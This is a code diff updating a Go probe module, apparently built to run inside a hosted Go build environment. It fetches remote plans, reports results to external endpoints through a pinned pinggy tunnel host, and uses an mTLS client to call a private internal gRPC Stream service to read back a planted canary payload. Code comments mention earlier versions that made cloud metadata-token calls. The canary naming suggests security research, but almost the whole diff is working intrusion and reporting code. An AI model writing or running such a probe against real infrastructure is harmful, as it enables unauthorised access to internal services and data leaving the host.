@@ -35,6 +35,11 @@ var probeUserAgent string
 var rpcServiceHost string
 var rpcDialAddress string
 
+// This digest is source-pinned rather than supplied by the callback plan or
+// build flags.  It identifies the exact already-consumed v44 owned-B URL.
+// Tests temporarily replace it only to exercise URL validation.
+var pinnedReadbackURLSHA256 = "78d7361f8ebd389fc5da7ba45c0e69cde74fbc290522804942bc3cb42fe30334"
+
 // DESCRIPTOR_PATCH_POINT: build.py must set these values only from the pinned
 // Byteman FileDescriptorSet receipt above. Empty values fail closed before Download.
 var descriptorDownloadPolicyField string
@@ -48,16 +53,17 @@ var descriptorRedirectPolicyName string
 const (
 	protocolVersion              = 1
 	moduleName                   = "github.com/benr00t3d/go-cgo-pkgsite-probe"
-	probeVersion                 = "v0.0.48-codex"
+	probeVersion                 = "v0.0.50-codex"
 	targetRegistry               = "https://proxy.golang.org"
 	targetModuleName             = "github.com/benr00t3d/go-byteman-crosswrite-canary"
 	targetVersion                = "v0.0.1"
 	targetCanarySHA256           = "e795c7054b74d0edf37273a3d6d1098fc57fd7e124d10a0556d3793eb3210684"
 	targetCanaryBytes            = 2512
+	pinnedReadbackHost           = "auciz-64-62-226-208.run.pinggy-free.link"
 	originGoneSHA256             = "2060dcc16cdd2cb518700076b1ccf2fadbff619b32af84250c176e70590f1f0a"
 	originGoneBytes              = 36
-	downloadSource               = "robert-owned-v048-cross-package-offline-canary"
-	expectedUserAgent            = "go-cgo-pkgsite-probe-v048-codex"
+	downloadSource               = "robert-owned-v050-cross-package-offline-canary"
+	expectedUserAgent            = "go-cgo-pkgsite-probe-v050-codex"
 	sosSessionMetadataKey        = "X-SOS-SessionID"
 	descriptorReceiptSHA256      = "2f971b887a6da75675db2d570d14fe28f788a1513cefec2f3c521afb725ec225"
 	maximumResult                = 256 * 1024
@@ -77,6 +83,8 @@ const (
 	postWriteCallLimit           = 60 * time.Second
 	postWritePollDelay           = 2 * time.Second
 	maximumPostWritePollAttempts = 16
+	maximumStreamFrames          = 128
+	maximumStreamFrameBytes      = 64 * 1024
 )
 
 var bucketNames = []string{
@@ -179,6 +187,16 @@ type grpcResult struct {
 	PayloadBytes         int               `json:"payload_bytes,omitempty"`
 	PayloadSHA256        string            `json:"payload_sha256,omitempty"`
 	PayloadPath          string            `json:"payload_path,omitempty"`
+	FrameCount           int               `json:"frame_count,omitempty"`
+	FrameSHA256          []string          `json:"frame_sha256,omitempty"`
+	HeaderCount          int               `json:"header_count,omitempty"`
+	HeaderSHA256         string            `json:"header_sha256,omitempty"`
+	HeaderValid          bool              `json:"header_valid"`
+	HeaderStatusSet      bool              `json:"header_status_set"`
+	HeaderStatusCode     uint64            `json:"header_status_code,omitempty"`
+	HeaderContentType    string            `json:"header_content_type,omitempty"`
+	RawHeaderCount       int               `json:"raw_header_count,omitempty"`
+	EarlyClose           bool              `json:"early_close_after_exact_payload"`
 	AnalysisError        string            `json:"analysis_error,omitempty"`
 	Error                string            `json:"error,omitempty"`
 }
@@ -303,7 +321,6 @@ func validateRuntimeConfiguration() error {
 		{genericResultURL, "/v1/result/" + sessionNonce + "/generic"},
 		{compilerResultURL, "/v1/result/" + sessionNonce + "/compiler"},
 		{planURL, "/v1/plan/" + sessionNonce},
-		{bytemanCanaryURL, "/v1/goproxy/" + sessionNonce + "/github.com/benr00t3d/go-byteman-crosswrite-canary/@v/" + targetVersion + ".zip"},
 	}
 	var origin string
 	for _, item := range paths {
@@ -320,6 +337,25 @@ func validateRuntimeConfiguration() error {
 	}
 	if genericResultURL == compilerResultURL {
 		return errors.New("runtime result endpoints were not distinct")
+	}
+	readback, err := url.Parse(bytemanCanaryURL)
+	if err != nil || readback.Scheme != "https" || readback.Host != pinnedReadbackHost ||
+		readback.User != nil || readback.Opaque != "" || readback.RawPath != "" || readback.RawQuery != "" ||
+		readback.ForceQuery || readback.Fragment != "" {
+		return errors.New("readback URL was outside the source-pinned HTTPS authority")
+	}
+	prefix := "/v1/goproxy/"
+	suffix := "/" + targetModuleName + "/@v/" + targetVersion + ".zip"
+	if !strings.HasPrefix(readback.Path, prefix) || !strings.HasSuffix(readback.Path, suffix) {
+		return errors.New("readback URL did not name the exact owned-B module version")
+	}
+	readbackSession := strings.TrimSuffix(strings.TrimPrefix(readback.Path, prefix), suffix)
+	if !validSessionNonce(readbackSession) || strings.Contains(readbackSession, "/") {
+		return errors.New("readback URL session segment was invalid")
+	}
+	readbackDigest := sha256.Sum256([]byte(bytemanCanaryURL))
+	if hex.EncodeToString(readbackDigest[:]) != pinnedReadbackURLSHA256 {
+		return errors.New("readback URL did not match the source-pinned v44 digest")
 	}
 	return nil
 }
@@ -339,7 +375,7 @@ func main() {
 	report := newProbeReport(started, identity)
 	report.Reason = "internal checks are fixed to the verified capslock lane"
 	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(genericResultURL, "v048-codex-"+identity.Lane, cwd, started, report)
+	_ = submitProbeReport(genericResultURL, "v050-codex-"+identity.Lane, cwd, started, report)
 }
 
 func newProbeReport(started time.Time, identity identityResult) probeReport {
@@ -482,14 +518,13 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 	fillCapslockContext(&initial)
 	initial.Reason = "waiting for a bounded Byteman plan"
 	initial.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	if err := submitProbeReport(compilerResultURL, "v048-codex-capslock-initial", cwd, started, initial); err != nil {
+	if err := submitProbeReport(compilerResultURL, "v050-codex-capslock-initial", cwd, started, initial); err != nil {
 		return
 	}
 
 	deadline := time.Now().Add(planPollWindow)
 	cursor := 0
 	consecutiveErrors := 0
-	budget := &mutationBudget{}
 	for cursor < maximumPlanStep && time.Now().Before(deadline) {
 		step, available, err := fetchPlan(cursor)
 		if err != nil {
@@ -512,15 +547,13 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		switch step.Action {
 		case "finish":
 			report.Reason = "bounded plan finished"
-		case "inspect-session-dataflow":
-			runSessionDataflowInspection(&report)
-		case "probe-byteman":
-			runBytemanProbe(&report, step.RouteMode, budget)
+		case "stream-existing-v44":
+			runExistingReadback(&report, step.RouteMode)
 		default:
 			report.Reason = "validated plan action had no implementation"
 		}
 		report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-		id := "v048-codex-step-" + strconv.Itoa(cursor)
+		id := "v050-codex-step-" + strconv.Itoa(cursor)
 		if err := submitProbeReport(compilerResultURL, id, cwd, stepStarted, report); err != nil {
 			return
 		}
@@ -539,7 +572,7 @@ func runCapslockSession(started time.Time, cwd string, identity identityResult) 
 		final.Reason = "bounded plan polling window expired"
 	}
 	final.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
-	_ = submitProbeReport(compilerResultURL, "v048-codex-final", cwd, finalStarted, final)
+	_ = submitProbeReport(compilerResultURL, "v050-codex-final", cwd, finalStarted, final)
 }
 
 func fetchPlan(cursor int) (planStep, bool, error) {
@@ -595,13 +628,13 @@ func validatePlanStep(step planStep) error {
 		}
 	}
 	switch step.Action {
-	case "probe-byteman":
-		if !allowedRouteMode(step.RouteMode) {
-			return errors.New("plan route mode was not allowed")
+	case "stream-existing-v44":
+		if step.RouteMode != "byteman-localhost" {
+			return errors.New("readback plan did not use the one fixed direct route")
 		}
-	case "inspect-session-dataflow", "finish":
+	case "finish":
 		if step.RouteMode != "" {
-			return errors.New("non-probe plan included route parameters")
+			return errors.New("finish plan included route parameters")
 		}
 	default:
 		return errors.New("plan action was not allowed")
@@ -620,12 +653,37 @@ func allowedRouteMode(value string) bool {
 }
 
 func fillCapslockContext(report *probeReport) {
-	metadataClient := &http.Client{
-		Transport: &http.Transport{Proxy: nil},
-		Timeout:   requestTimeout,
+	// v50 is intentionally narrower than the earlier discovery clients: it
+	// makes no metadata-token or cloud API calls.  The only private business RPC
+	// reachable from its plan is the fixed Stream readback below.
+	report.Reason = "read-only Stream client; no cloud permission checks"
+}
+
+func runExistingReadback(report *probeReport, routeMode string) {
+	canaryURLDigest := sha256.Sum256([]byte(bytemanCanaryURL))
+	report.CanaryURLSHA256 = hex.EncodeToString(canaryURLDigest[:])
+	report.CanaryBodySHA256 = targetCanarySHA256
+	if err := validateRuntimeConfiguration(); err != nil {
+		report.Reason = "source-pinned owned-B readback validation failed"
+		return
 	}
-	metadata, _ := inspectMetadata(metadataClient)
-	report.Metadata = metadata
+	client, endpoint, err := newMTLSClient(routeMode)
+	if err != nil {
+		report.Byteman = append(report.Byteman, grpcResult{Method: "client-setup", Error: cleanError(err)})
+		report.Reason = "fixed direct mTLS client setup failed"
+		return
+	}
+	defer client.CloseIdleConnections()
+	result := callStreamIncremental(client, endpoint)
+	report.Byteman = append(report.Byteman, result)
+	report.FreshMTLSClient = true
+	report.StreamVerified = result.AnalysisError == "" && result.Error == "" && result.EarlyClose &&
+		result.PayloadBytes == targetCanaryBytes && result.PayloadSHA256 == targetCanarySHA256
+	if report.StreamVerified {
+		report.Reason = "exact existing v44 owned-B payload returned by Byteman Stream"
+	} else {
+		report.Reason = "bounded existing-record Stream readback did not return the exact payload"
+	}
 }
 
 func runBytemanProbe(report *probeReport, routeMode string, budget *mutationBudget) {
@@ -885,6 +943,269 @@ func callStream(client *http.Client, endpoint string) grpcResult {
 	result.PayloadSHA256 = hex.EncodeToString(digest[:])
 	result.PayloadPath = path
 	return result
+}
+
+// callStreamIncremental is deliberately separate from callGRPCRaw. Stream is
+// server-streaming and may keep the HTTP/2 stream open after sending the file;
+// waiting for EOF can therefore turn valid data into a deadline/CANCEL. This
+// reader closes immediately after the exact source-pinned payload is complete.
+func callStreamIncremental(client *http.Client, endpoint string) grpcResult {
+	const method = "/sos.byteman.Byteman/Stream"
+	result := grpcResult{ID: "existing-v44-stream-readback", Method: method}
+	payload := buildTargetStreamRequest(bytemanCanaryURL)
+	frame := attachRequestTranscript(&result, payload)
+	if len(payload) != 282 {
+		result.Error = "exact StreamRequest payload length was not 282 bytes"
+		return result
+	}
+	decoded, valid := decodeWireMessage(payload, 0)
+	if !valid || len(decoded.fields) != 2 || decoded.fields[0].number != 1 || decoded.fields[0].wire != 2 ||
+		string(decoded.fields[0].value) != bytemanCanaryURL || decoded.fields[1].number != 2 ||
+		decoded.fields[1].wire != 2 {
+		result.Error = "StreamRequest was not exact URL plus metadata"
+		return result
+	}
+	metadata, valid := decodeWireMessage(decoded.fields[1].value, 0)
+	if !valid || len(decoded.fields[1].value) != 89 || !targetMetadataMatches(metadata) {
+		result.Error = "StreamRequest metadata was not the exact 89-byte owned-B coordinate"
+		return result
+	}
+
+	ctx, cancel := context.WithTimeout(context.Background(), bytemanHTTPTimeout)
+	defer cancel()
+	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+method, bytes.NewReader(frame))
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
+	}
+	request.Header.Set("Content-Type", "application/grpc")
+	request.Header.Set("TE", "trailers")
+	request.Header.Set("User-Agent", probeUserAgent)
+	request.Header.Set(sosSessionMetadataKey, "")
+	request.Header.Set("Grpc-Timeout", "60S")
+	response, err := client.Do(request)
+	if err != nil {
+		result.Error = cleanError(err)
+		return result
+	}
+	defer response.Body.Close()
+	result.HTTPStatus = response.StatusCode
+	result.ContentType = response.Header.Get("Content-Type")
+	contentType := strings.ToLower(strings.TrimSpace(strings.Split(result.ContentType, ";")[0]))
+	if response.StatusCode != http.StatusOK ||
+		(contentType != "application/grpc" && contentType != "application/grpc+proto") {
+		result.Error = "Stream endpoint did not return HTTP 200 application/grpc"
+		return result
+	}
+	result.Authenticated = true
+	analysis, err := readExactStreamFrames(response.Body)
+	result.BodyBytes = analysis.BodyBytes
+	result.BodySHA256 = analysis.BodySHA256
+	result.FrameCount = analysis.FrameCount
+	result.FrameSHA256 = analysis.FrameSHA256
+	result.Wire = analysis.Wire
+	result.HeaderCount = analysis.HeaderCount
+	result.HeaderSHA256 = analysis.HeaderSHA256
+	result.HeaderValid = analysis.Header.Valid
+	result.HeaderStatusSet = analysis.Header.StatusSet
+	result.HeaderStatusCode = analysis.Header.StatusCode
+	result.HeaderContentType = analysis.Header.ContentType
+	result.RawHeaderCount = analysis.Header.RawCount
+	result.PayloadBytes = len(analysis.Payload)
+	result.PayloadSHA256 = analysis.PayloadSHA256
+	result.PayloadPath = analysis.PayloadPath
+	if err != nil {
+		result.AnalysisError = cleanError(err)
+		return result
+	}
+	result.EarlyClose = true
+	// grpc-status is intentionally not required: the verified terminal
+	// condition is the exact bounded payload, reached before streaming EOF.
+	result.GRPCStatus = response.Header.Get("Grpc-Status")
+	return result
+}
+
+type incrementalStreamAnalysis struct {
+	BodyBytes     int
+	BodySHA256    string
+	FrameCount    int
+	FrameSHA256   []string
+	Wire          []wireFieldDigest
+	HeaderCount   int
+	HeaderSHA256  string
+	Header        streamHeaderAnalysis
+	Payload       []byte
+	PayloadSHA256 string
+	PayloadPath   string
+}
+
+func readExactStreamFrames(reader io.Reader) (incrementalStreamAnalysis, error) {
+	analysis := incrementalStreamAnalysis{}
+	bodyHasher := sha256.New()
+	finishBody := func() {
+		analysis.BodySHA256 = hex.EncodeToString(bodyHasher.Sum(nil))
+	}
+	seenData := false
+	for analysis.FrameCount < maximumStreamFrames {
+		header := make([]byte, 5)
+		if _, err := io.ReadFull(reader, header); err != nil {
+			finishBody()
+			return analysis, fmt.Errorf("Stream ended before the exact payload: %w", err)
+		}
+		analysis.BodyBytes += len(header)
+		_, _ = bodyHasher.Write(header)
+		if header[0] != 0 {
+			finishBody()
+			return analysis, errors.New("compressed Stream gRPC frame was not allowed")
+		}
+		length := int(binary.BigEndian.Uint32(header[1:]))
+		if length < 0 || length > maximumStreamFrameBytes || analysis.BodyBytes+length > maximumBody {
+			finishBody()
+			return analysis, errors.New("Stream gRPC frame exceeded the bounded response size")
+		}
+		messageBytes := make([]byte, length)
+		if _, err := io.ReadFull(reader, messageBytes); err != nil {
+			finishBody()
+			return analysis, fmt.Errorf("truncated Stream gRPC frame: %w", err)
+		}
+		analysis.BodyBytes += len(messageBytes)
+		_, _ = bodyHasher.Write(messageBytes)
+		fullFrame := append(append([]byte(nil), header...), messageBytes...)
+		frameDigest := sha256.Sum256(fullFrame)
+		analysis.FrameSHA256 = append(analysis.FrameSHA256, hex.EncodeToString(frameDigest[:]))
+		frameIndex := analysis.FrameCount
+		analysis.FrameCount++
+
+		message, valid := decodeWireMessage(messageBytes, 0)
+		if !valid {
+			finishBody()
+			return analysis, errors.New("Stream frame was not valid bounded protobuf wire data")
+		}
+		if err := walkWireMessage(message, "frame["+strconv.Itoa(frameIndex)+"]", &analysis.Wire); err != nil {
+			finishBody()
+			return analysis, err
+		}
+		for _, field := range message.fields {
+			switch field.number {
+			case 1:
+				if field.wire != 2 || analysis.HeaderCount != 0 || seenData {
+					finishBody()
+					return analysis, errors.New("StreamResponse header was duplicated, reordered, or had the wrong wire type")
+				}
+				analysis.HeaderCount = 1
+				headerDigest := sha256.Sum256(field.value)
+				analysis.HeaderSHA256 = hex.EncodeToString(headerDigest[:])
+				header, err := analyzeStreamHeader(field.value)
+				if err != nil {
+					finishBody()
+					return analysis, err
+				}
+				analysis.Header = header
+			case 2:
+				if field.wire != 2 {
+					finishBody()
+					return analysis, errors.New("StreamResponse data field 2 had the wrong wire type")
+				}
+				seenData = true
+				if len(analysis.Payload)+len(field.value) > targetCanaryBytes {
+					finishBody()
+					return analysis, errors.New("StreamResponse data exceeded the exact canary size")
+				}
+				analysis.Payload = append(analysis.Payload, field.value...)
+			default:
+				finishBody()
+				return analysis, errors.New("StreamResponse contained an unexpected top-level field")
+			}
+		}
+		if len(analysis.Payload) == targetCanaryBytes {
+			payloadDigest := sha256.Sum256(analysis.Payload)
+			analysis.PayloadSHA256 = hex.EncodeToString(payloadDigest[:])
+			analysis.PayloadPath = "top-level-field-2"
+			finishBody()
+			if analysis.PayloadSHA256 != targetCanarySHA256 {
+				return analysis, errors.New("exact-length StreamResponse payload had the wrong SHA-256")
+			}
+			if analysis.HeaderCount != 1 || !analysis.Header.Valid {
+				return analysis, errors.New("exact StreamResponse payload lacked one valid status-200 Header")
+			}
+			return analysis, nil
+		}
+	}
+	finishBody()
+	return analysis, errors.New("Stream response exceeded the bounded frame count")
+}
+
+type streamHeaderAnalysis struct {
+	Valid       bool
+	StatusSet   bool
+	StatusCode  uint64
+	ContentType string
+	RawCount    int
+}
+
+func analyzeStreamHeader(value []byte) (streamHeaderAnalysis, error) {
+	analysis := streamHeaderAnalysis{}
+	header, valid := decodeWireMessage(value, 0)
+	if !valid {
+		return analysis, errors.New("StreamResponse Header was not valid protobuf wire data")
+	}
+	counts := map[int]int{}
+	for _, field := range header.fields {
+		if field.number < 1 || field.number > 9 {
+			return analysis, errors.New("StreamResponse Header contained a field outside the pinned 1..9 schema")
+		}
+		counts[field.number]++
+		if field.number != 9 && counts[field.number] > 1 {
+			return analysis, errors.New("StreamResponse Header duplicated an optional field")
+		}
+		switch field.number {
+		case 1, 3, 4:
+			if field.wire != 2 || len(field.value) > 4096 || !utf8.Valid(field.value) {
+				return analysis, errors.New("StreamResponse Header string field was invalid or unbounded")
+			}
+			if field.number == 1 {
+				analysis.ContentType = string(field.value)
+			}
+		case 2, 5, 6, 7, 8:
+			if field.wire != 0 {
+				return analysis, errors.New("StreamResponse Header integer field had the wrong wire type")
+			}
+			if field.number == 2 {
+				analysis.StatusSet = true
+				analysis.StatusCode = field.varint
+			}
+		case 9:
+			if field.wire != 2 || counts[9] > 64 {
+				return analysis, errors.New("StreamResponse Header raw field was invalid or unbounded")
+			}
+			raw, valid := decodeWireMessage(field.value, 0)
+			if !valid {
+				return analysis, errors.New("StreamResponse raw Header was not valid protobuf wire data")
+			}
+			rawCounts := map[int]int{}
+			for _, item := range raw.fields {
+				rawCounts[item.number]++
+				if item.wire != 2 || (item.number != 1 && item.number != 2) || rawCounts[item.number] > 1 {
+					return analysis, errors.New("StreamResponse raw Header did not match key/value fields 1 and 2")
+				}
+				if item.number == 1 && (len(item.value) > 1024 || !utf8.Valid(item.value)) {
+					return analysis, errors.New("StreamResponse raw Header key was invalid or unbounded")
+				}
+				if item.number == 2 && len(item.value) > 16*1024 {
+					return analysis, errors.New("StreamResponse raw Header value was unbounded")
+				}
+			}
+			if rawCounts[1] != 1 || rawCounts[2] != 1 {
+				return analysis, errors.New("StreamResponse raw Header omitted key or value")
+			}
+			analysis.RawCount++
+		}
+	}
+	if !analysis.StatusSet || analysis.StatusCode != http.StatusOK {
+		return analysis, errors.New("StreamResponse Header did not contain status_code 200")
+	}
+	analysis.Valid = true
+	return analysis, nil
 }
 
 func waitOriginOffline() originResult {
